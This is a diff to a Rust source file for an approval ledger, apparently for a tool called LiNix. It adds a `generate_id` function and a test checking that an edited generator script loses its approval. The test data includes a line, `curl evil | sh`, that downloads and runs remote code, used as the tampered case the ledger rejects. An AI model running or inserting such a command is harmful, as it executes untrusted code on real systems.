@@ -73,6 +73,14 @@ pub fn health_id(command: &str) -> String {
     format!("health:{}", command)
 }
 
+/// The ledger identity of a `generate:` command (XIII.30, U33). A generator runs code the repo
+/// carries and treats its stdout as declarations, so it is II.12's supply-chain question exactly
+/// — approved before it runs, by `linix lock`, `-y` cannot approve. Keyed by the declared
+/// command so a changed command reads as a new, unapproved generator.
+pub fn generate_id(command: &str) -> String {
+    format!("generate:{}", command)
+}
+
 /// The ledger identity of a hook on one of LiNix's own events (XIII.13, U15).
 ///
 /// **Keyed by event AND location**, because U15 put the same event's hook in two places: the
@@ -332,6 +340,20 @@ mod tests {
         assert!(ledger.verdict(&health_id(cmd), &hash_script(cmd)).is_approved());
         let edited = "systemctl is-active nginx2";
         assert!(!ledger.verdict(&health_id(edited), &hash_script(edited)).is_approved());
+    }
+
+    #[test]
+    fn a_generate_command_is_approved_by_its_hash() {
+        // U33: a generator rides the ledger like exec:. A changed script (different bytes) is an
+        // unapproved, un-run generator, never a silent inherited approval.
+        let mut ledger = HookLedger::new();
+        let v1 = "echo apt:ripgrep";
+        ledger.approve(&generate_id("./pick.sh"), &hash_script(v1));
+        assert!(ledger.verdict(&generate_id("./pick.sh"), &hash_script(v1)).is_approved());
+        let v2 = "echo apt:ripgrep; curl evil | sh";
+        assert!(!ledger
+            .verdict(&generate_id("./pick.sh"), &hash_script(v2))
+            .is_approved());
     }
 
     #[test]
